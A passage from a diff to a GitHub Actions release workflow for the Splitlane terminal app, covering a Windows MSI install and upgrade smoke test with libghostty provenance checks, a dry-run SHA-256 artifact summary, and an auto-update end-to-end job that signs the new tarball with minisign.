+                      '-Target', 'x86_64-pc-windows-msvc',
+                      '-Binary', $exe,
+                      '-PackageRoot', $installDir,
+                      '-RuntimeEvidence', $freshGhosttyEvidence,
+                      '-ReportPath', $installedReportPath,
+                      '-AllowReleaseAssets'
+                  ) `
+                  -Label 'installed libghostty verifier'
+
+              $installedReportText = Get-Content -LiteralPath $installedReportPath -Raw
+              if ($installedReportText -match '(?i)[a-z]:\\') {
+                  throw 'Installed libghostty provenance report contains a runner-local absolute path'
+              }
+              $installedReport = $installedReportText | ConvertFrom-Json
+              $installedBinaryHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $exe).Hash.ToLowerInvariant()
+              if ($installedReport.linkage -ne 'static' -or
+                  $installedReport.runtime_smoke_verified -ne $true -or
+                  $installedReport.binary_sha256 -ne $installedBinaryHash) {
+                  throw 'Installed libghostty provenance does not match the statically linked Splitlane binary'
+              }
+              if ($releaseReport.binary_sha256 -ne $installedBinaryHash) {
+                  throw 'Packaged Windows libghostty provenance does not match the installed Splitlane binary'
+              }
+              foreach ($requiredFile in @('splitlane.exe') + @($complianceSources.Keys)) {
+                  if (@($installedReport.package_files) -notcontains $requiredFile) {
+                      throw "Installed libghostty provenance is missing package inventory entry $requiredFile"
+                  }
+              }
+
+              $relayExe = Join-Path $env:SMOKE_DIR 'splitlane-msi-relay.exe'
+              $relayMsi = Join-Path $env:SMOKE_DIR $msi.Name
+              $relayLog = Join-Path $env:SMOKE_DIR 'relay.log'
+              $relayMsiLog = Join-Path $env:SMOKE_DIR 'relay-msiexec.log'
+              $restartProbe = Join-Path $env:WINDIR 'System32\whoami.exe'
+              $missingParentPid = '4294967295'
+
+              Copy-Item -LiteralPath $exe -Destination $relayExe -Force
+              Copy-Item -LiteralPath $msi.FullName -Destination $relayMsi -Force
+
+              try {
+                  Invoke-SmokeProcess `
+                      -FilePath $relayExe `
+                      -Arguments @(
+                          '--msi-relay',
+                          '--parent-pid', $missingParentPid,
+                          '--msi', $relayMsi,
+                          '--msi-log', $relayMsiLog,
+                          '--restart', $restartProbe,
+                          '--relay-log', $relayLog
+                      ) `
+                      -Label 'splitlane MSI relay'
+              } catch {
+                  Show-LogTail -Path $relayLog
+                  Show-LogTail -Path $relayMsiLog
+                  throw
+              }
+
+              if (Test-Path -LiteralPath $relayMsi) {
+                  throw "MSI relay did not remove staged MSI copy: $relayMsi"
+              }
+
+              $relayText = Get-Content -LiteralPath $relayLog -Raw
+              foreach ($needle in @(
+                  'started pid=',
+                  "parent $missingParentPid already exited or cannot be opened",
+                  'running msiexec',
+                  'msiexec exited with 0',
+                  'relaunch requested'
+              )) {
+                  if (-not $relayText.Contains($needle)) {
+                      throw "Relay log missing expected entry '$needle'"
+                  }
+              }
+          } finally {
+              if ($installed) {
+                  try {
+                      Invoke-SmokeProcess `
+                          -FilePath $msiexec `
+                          -Arguments @('/x', $uninstallMsi, '/qn', '/norestart', '/l*v', $uninstallLog) `
+                          -Label 'msiexec uninstall'
+                  } catch {
+                      Show-LogTail -Path $uninstallLog
+                      throw
+                  }
+              }
+          }
+
+          Assert-NoMsiResidue -Label 'Candidate upgrade uninstall'
+          if (-not (Test-Path -LiteralPath $configPath -PathType Leaf) -or
+              (Get-FileHash -LiteralPath $configPath -Algorithm SHA256).Hash -ne $configHashBeforeUpgrade) {
+              throw 'MSI uninstall did not preserve the explicit Alacritty rollback configuration'
+          }
+
+      - name: Record manual Windows backend smoke boundary
+        if: success()
+        run: |
+          @'
+          ## Windows backend release boundary
+
+          CI proved fresh install, hosted-desktop Ghostty and Alacritty launches,
+          the signed v0.8.0 MSI upgrade, preserved rollback configuration, static
+          libghostty provenance, installed compliance inventory, updater relay,
+          and clean uninstall. A release reviewer must still execute the full
+          Windows 10 and Windows 11 desktop matrix, including IME, GPU,
+          sleep/resume, non-ASCII profile paths, and conditional RDP.
+          '@ | Add-Content -LiteralPath $env:GITHUB_STEP_SUMMARY
+
+      - name: Upload Windows libghostty smoke provenance
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: windows-libghostty-smoke-provenance-${{ github.run_id }}
+          path: |
+            ${{ runner.temp }}\splitlane-msi-smoke\*libghostty-provenance.json
+            ${{ runner.temp }}\splitlane-msi-smoke\ghostty-runtime-evidence.json
+          if-no-files-found: warn
+          retention-days: 7
+
+      - name: Upload Windows MSI smoke logs on failure
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: windows-msi-smoke-logs-${{ github.run_id }}
+          path: ${{ runner.temp }}\splitlane-msi-smoke
+          if-no-files-found: warn
+          retention-days: 7
+
+  # ─── Dry-run artifact summary ───────────────────────────────────────
+  # In dry-run mode the `release:` job is skipped, so there's no
+  # GitHub Release page to inspect. This job downloads every
+  # `release-assets-*` workflow artifact produced by the build matrix
+  # and writes a SHA-256 manifest into the Actions UI Summary so the
+  # release engineer can verify naming, size, and integrity at a
+  # glance before deciding whether to cut the real tag.
+  #
+  # Only runs in dry-run mode - the real release job already
+  # publishes the artifacts to GitHub Releases (which renders the
+  # same SHA-256 sidecars next to each asset).
+  dry-run-summary:
+    name: Dry-run artifact summary
+    if: github.event_name == 'workflow_dispatch'
+    needs: build
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Download all release-assets-* workflow artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: release-assets
+          pattern: release-assets-*
+          merge-multiple: true
+
+      - name: Render artifact + SHA-256 table to job summary
+        env:
+          DRYRUN_TAG: ${{ env.RELEASE_TAG }}
+          DRYRUN_REF: ${{ env.RELEASE_REF }}
+        run: |
+          set -euo pipefail
+          {
+            echo "## Dry-run artifacts (${DRYRUN_TAG})"
+            echo
+            echo "Built from \`${DRYRUN_REF}\`. Workflow artifacts have"
+            echo "7-day retention - download them from the Actions UI"
+            echo "sidebar to inspect before cutting the real tag."
+            echo
+            echo "| Asset | Size | SHA-256 |"
+            echo "|---|---:|---|"
+          } >> "$GITHUB_STEP_SUMMARY"
+          # `find -print0` keeps filenames with spaces / unicode safe.
+          # `sha256sum` is part of coreutils on ubuntu-22.04 (always
+          # present). Sort by name so the table is deterministic across
+          # runs and diffable between two back-to-back dry-runs. Skip
+          # the `*.sha256` sidecars we already emitted at build time -
+          # they would clutter the table and their content is the next
+          # column anyway.
+          while IFS= read -r -d '' f; do
+            [ -d "$f" ] && continue
+            case "$f" in
+              *.sha256) continue ;;
+            esac
+            name="$(basename "$f")"
+            size="$(stat -c '%s' "$f")"
+            hash="$(sha256sum "$f" | awk '{print $1}')"
+            printf '| `%s` | %s | `%s` |\n' "$name" "$size" "$hash"
+          done < <(find release-assets -type f -print0 | sort -z) \
+            >> "$GITHUB_STEP_SUMMARY"
+
+  # ─── Auto-update e2e (publish-gating) ───────────────────────────────
+  # Builds OLD splitlane at the previous tag in a git worktree, builds
+  # NEW from this checkout, serves a fixture `latest.json` + tarball
+  # via python3's http.server on localhost, then runs OLD with
+  # `--update-and-exit` pointing at the fixture.
+  # Three scenarios - happy tar.gz swap, hash-mismatch rejection,
+  # feed-unreachable surfaced as exit 3 - all asserted by the script.
+  #
+  # Sits in `release.needs` so a tag cut never ships a binary that
+  # can't actually self-update from the previous release. This is the
+  # ONLY automated test of `src-app/src/update/` - splitlane-app has no
+  # unit tests, so dropping this gate would ship updater regressions
+  # silently. A previous nightly variant (auto_update_e2e.yml on cron)
+  # was deleted 2026-05-27 as redundant with this release gate at the
+  # current ~monthly release cadence.
+  auto-update-e2e:
+    name: Auto-update e2e (Linux x86_64)
+    needs: build
+    runs-on: ubuntu-22.04
+    # The E2E signs the NEW tarball before publish so it can remain a
+    # hard `release.needs` gate. That requires the same minisign secret as
+    # the publish job, stored on the protected `release` environment.
+    environment: release
+    # Pre-refactor (≤ v0.3.3): this job did two full `cargo build
+    # --release` (NEW from current tree, OLD from a worktree at the
+    # previous tag), routinely ~20-25 min on cold cache. It was by
+    # far the longest leg of the release pipeline.
+    #
+    # Refactor (2026-05-27): the harness now accepts E2E_NEW_TARBALL
+    # and E2E_OLD_TARBALL env vars and uses them directly when set
+    # (scripts/test-update-e2e.sh). The NEW tarball is reused from
+    # the matrix `build` job's artifact (already built + bundled +
+    # sha256-sided 5 minutes earlier - no point rebuilding). The OLD
+    # tarball is fetched from the previous GitHub release, which is
+    # strictly more faithful than a from-source rebuild: we now test
+    # the exact byte sequence real users have on disk.
+    #
+    # Result: ~2-3 min job (no cargo build, no toolchain install). It does
+    # NOT need Vulkan/Wayland windowing deps since `--update-and-exit` never
+    # opens a GPUI window -- but it DOES need the binary's hard NEEDED shared
+    # libs (libxkbcommon.so.0 + libxkbcommon-x11.so.0, see `readelf -d`),
+    # which the dynamic linker resolves at exec, before main(), regardless of
+    # whether a window opens. See the explicit install step below.
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ env.RELEASE_REF }}
+          # Shallow checkout is enough now that the harness no longer
+          # does `git worktree add` for the OLD source.
+          fetch-depth: 1
+
+      # The released binary links libxkbcommon-x11.so.0 + libxkbcommon.so.0
+      # as hard NEEDED entries, so the dynamic linker resolves them at exec
+      # even under `--update-and-exit`. The ubuntu-22.04 runner image stopped
+      # guaranteeing libxkbcommon-x11-0 (the SAME binary deps passed on
+      # 2026-05-27 for v0.3.3 and failed on 2026-05-28 for v0.3.4 with a bare
+      # "cannot open shared object file" exit 127). Install it explicitly so
+      # the job is hermetic against runner-image drift.
+      - name: Install runtime libs the binary links (resolved at exec)
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y libxkbcommon-x11-0
+
+      # Pull the NEW tarball straight from the matrix `build` job's
+      # x86_64 Linux artifact. The matrix uploads
+      # release-assets-x86_64-Linux which contains every Linux x86_64
+      # artifact (.tar.gz, .deb, .rpm, AppImage, sha256 sidecars); the
+      # harness only consumes splitlane-<ver>-x86_64.tar.gz.
+      - name: Download NEW build artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64-Linux
+          path: ${{ runner.temp }}/e2e-new
+
+      # Fetch the most recent published stable release as OLD. Selecting
+      # the latest non-prerelease ensures the harness exercises the
+      # update path users would actually traverse - never a `-rc.N`
+      # build, which `release.published` already excludes from cask /
+      # winget anyway. If no stable release exists yet (first release
+      # ever, or first after a long pre-release train) the script's
+      # self-bootstrap guard at scripts/test-update-e2e.sh:168 takes
+      # over and exits 0 with a "harness no-op" message.
+      - name: Resolve previous stable release tag
+        id: prev_release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          # `gh release list --exclude-pre-releases` filters at the API
+          # layer (stable JSON, no client-side regex needed). Take the
+          # newest entry by createdAt (gh's default sort). Skip the tag
+          # currently being released (RELEASE_TAG) when this run is a
+          # tag-push - otherwise we'd compare a tag against itself.
+          CURRENT_TAG="${RELEASE_TAG:-}"
+          PREV_TAG="$(gh release list \
+              --exclude-pre-releases \
+              --exclude-drafts \
+              --limit 5 \
+              --json tagName,createdAt \
+              --jq 'sort_by(.createdAt) | reverse | .[] | .tagName' \
+            | grep -v "^${CURRENT_TAG}$" \
+            | head -n1)"
+          if [ -z "${PREV_TAG}" ]; then
+            echo "No previous stable release found - harness will self-bootstrap to no-op"
+            echo "old_version=" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          OLD_VERSION="${PREV_TAG#v}"
+          echo "Previous stable: ${PREV_TAG} (OLD_VERSION=${OLD_VERSION})"
+          echo "old_version=${OLD_VERSION}" >> "$GITHUB_OUTPUT"
+          echo "old_tag=${PREV_TAG}" >> "$GITHUB_OUTPUT"
+
+      - name: Download OLD release tarball
+        if: steps.prev_release.outputs.old_version != ''
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          mkdir -p "${RUNNER_TEMP}/e2e-old"
+          # Pattern is suffix-only matcher (v-prefix-agnostic) - matches
+          # both pre-v0.3.0 naming and v0.3.0+ naming.
+          gh release download "${{ steps.prev_release.outputs.old_tag }}" \
+            --pattern 'splitlane-*-x86_64.tar.gz' \
+            --dir "${RUNNER_TEMP}/e2e-old"
+          ls -la "${RUNNER_TEMP}/e2e-old"
+
+      # The build artifact predates the publish job's release signing, but
+      # auto-update-e2e now sits in `release.needs`. It cannot poll a
+      # GitHub Release that is waiting for this very job. Sign the NEW
+      # tarball here with the same minisign release key so OLD clients can
+      # verify the fixture before publish.
+      - name: Sign NEW tarball for auto-update e2e
+        if: steps.prev_release.outputs.old_version != ''
+        env:
+          MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
+        run: |
+          set -euo pipefail
+          if [ -z "${MINISIGN_SECRET_KEY}" ]; then
+            echo "::error::MINISIGN_SECRET_KEY is required for auto-update e2e because OLD clients verify fail-closed."
+            exit 1
+          fi
+
+          NEW_VERSION="$(awk -F'"' '/^version = / { print $2; exit }' Cargo.toml)"
+          tarball="${RUNNER_TEMP}/e2e-new/splitlane-${NEW_VERSION}-x86_64.tar.gz"
+          [ -s "${tarball}" ] || {
+            echo "::error::Expected NEW tarball not found before signing: ${tarball}"
+            ls -la "${RUNNER_TEMP}/e2e-new" || true
+            exit 1
+          }
+
+          MINISIGN_VERSION=0.12
+          MINISIGN_SHA256=9a599b48ba6eb7b1e80f12f36b94ceca7c00b7a5173c95c3efc88d9822957e73
+          curl -sSfL --retry 3 -o /tmp/minisign.tar.gz \
+            "https://github.com/jedisct1/minisign/releases/download/${MINISIGN_VERSION}/minisign-${MINISIGN_VERSION}-linux.tar.gz"
+          echo "${MINISIGN_SHA256}  /tmp/minisign.tar.gz" | sha256sum -c -
+          tar -xzf /tmp/minisign.tar.gz -C /tmp
+          sudo install -m 0755 /tmp/minisign-linux/x86_64/minisign /usr/local/bin/minisign
+          minisign -v
+
+          key_file="$(mktemp)"
+          trap 'rm -f "$key_file"' EXIT
+          printf '%s\n' "${MINISIGN_SECRET_KEY}" > "$key_file"
+          chmod 600 "$key_file"
+
+          base="$(basename "$tarball")"
+          minisign -S -s "$key_file" -m "$tarball" \
+            -t "splitlane release artifact ${base}" >/dev/null
+          test -s "${tarball}.minisig"
+          ls -la "${RUNNER_TEMP}/e2e-new"
+
+      - name: Run auto-update e2e harness
+        if: steps.prev_release.outputs.old_version != ''
+        env:
+          OLD_VERSION: ${{ steps.prev_release.outputs.old_version }}
+        run: |
+          set -euo pipefail
+          # NEW tarball name keys off the workspace package version
+          # (matches scripts/bundle-tarball.sh:50). Derived here rather
+          # than from a workflow env so the job is robust across
+          # release.yml refactors that change `NEW_VERSION` plumbing.
+          NEW_VERSION="$(awk -F'"' '/^version = / { print $2; exit }' Cargo.toml)"
+          echo "NEW_VERSION=${NEW_VERSION}"
+          E2E_NEW_TARBALL="${RUNNER_TEMP}/e2e-new/splitlane-${NEW_VERSION}-x86_64.tar.gz"
+          [ -s "${E2E_NEW_TARBALL}" ] || {
+            echo "::error::Expected NEW tarball not found in build artifact: ${E2E_NEW_TARBALL}"
+            ls -la "${RUNNER_TEMP}/e2e-new" || true
+            exit 1
+          }
+          # OLD tarball: find the single matching file. `gh release
+          # download` wrote the asset under e2e-old with whatever
+          # naming the release tagged.
+          E2E_OLD_TARBALL="$(find "${RUNNER_TEMP}/e2e-old" -maxdepth 1 -name 'splitlane-*-x86_64.tar.gz' | head -n1)"
+          [ -n "${E2E_OLD_TARBALL}" ] && [ -s "${E2E_OLD_TARBALL}" ] || {
+            echo "::error::Expected OLD tarball not found under ${RUNNER_TEMP}/e2e-old"
+            ls -la "${RUNNER_TEMP}/e2e-old" || true
+            exit 1
+          }
+          export E2E_NEW_TARBALL E2E_OLD_TARBALL
+          bash scripts/test-update-e2e.sh
+
+      - name: Self-bootstrap skip notice
+        if: steps.prev_release.outputs.old_version == ''
+        run: |
+          echo "::notice::No previous stable release published yet - auto-update e2e is a no-op for the first release. Will engage on the next tag cut."
+
+      - name: Upload e2e logs on failure
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: auto-update-e2e-logs-${{ github.run_id }}
+          path: |
+            /tmp/splitlane-e2e/*.stdout
+            /tmp/splitlane-e2e/*.stderr
+            /tmp/splitlane-e2e/http-server.log
+          retention-days: 7
+          if-no-files-found: warn
